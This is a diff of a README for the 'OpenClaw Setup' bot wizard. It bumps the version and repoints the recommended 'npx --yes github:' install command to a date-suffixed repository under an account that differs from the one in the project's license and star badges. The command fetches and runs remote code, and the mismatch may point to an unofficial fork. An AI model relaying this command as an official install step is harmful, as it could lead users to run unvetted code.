@@ -3,7 +3,7 @@
 # 🦞 OpenClaw Setup
 
 <p align="center">
-  <a href="https://github.com/dangthanhhung61-dotcom/openclaw-setup"><img src="https://img.shields.io/badge/SOURCE-v5.16.8-0EA5E9?style=for-the-badge" alt="Source 5.16.8" /></a>
+  <a href="https://github.com/dangthanhhung61-dotcom/openclaw-setup-2026-9-6"><img src="https://img.shields.io/badge/SOURCE-v5.16.12-0EA5E9?style=for-the-badge" alt="Source 5.16.12" /></a>
   <a href="https://github.com/tuanminhhole/openclaw-setup?tab=MIT-1-ov-file"><img src="https://img.shields.io/badge/LICENSE-MIT-success?style=for-the-badge" alt="MIT License" /></a>
   <a href="https://www.npmjs.com/package/create-openclaw-bot"><img src="https://img.shields.io/npm/v/create-openclaw-bot?style=for-the-badge&label=CLI&color=2563EB&logo=npm&logoColor=white" alt="NPM Version" /></a>
   <a href="https://github.com/tuanminhhole/openclaw-setup/stargazers"><img src="https://img.shields.io/github/stars/tuanminhhole/openclaw-setup?style=for-the-badge&color=eab308&logo=github&logoColor=white" alt="GitHub Stars" /></a>
@@ -40,14 +40,14 @@ npx create-openclaw-bot
 ```
 
 It downloads the wizard, starts the local server, and opens the Setup UI in your browser at **http://127.0.0.1:51789**.
-> The npm release may not include 5.16.8 yet. Use Method 2 for the latest GitHub installer.
+> The npm release may not include 5.16.12 yet. Use Method 2 for the latest GitHub installer.
 
-### 2️⃣ Method 2 — Run the newest GitHub source (recommended for 5.16.8)
+### 2️⃣ Method 2 — Run the newest GitHub source (recommended for 5.16.12)
 
 Use this if you specifically want the newest code directly from GitHub:
 
 ```bash
-npx --yes github:dangthanhhung61-dotcom/openclaw-setup
+npx --yes github:dangthanhhung61-dotcom/openclaw-setup-2026-9-6
 ```
 
 > **Git is required for this method.** Install [Git](https://git-scm.com/downloads) and make sure the `git` command works in your terminal first; otherwise npm cannot download the GitHub repository.
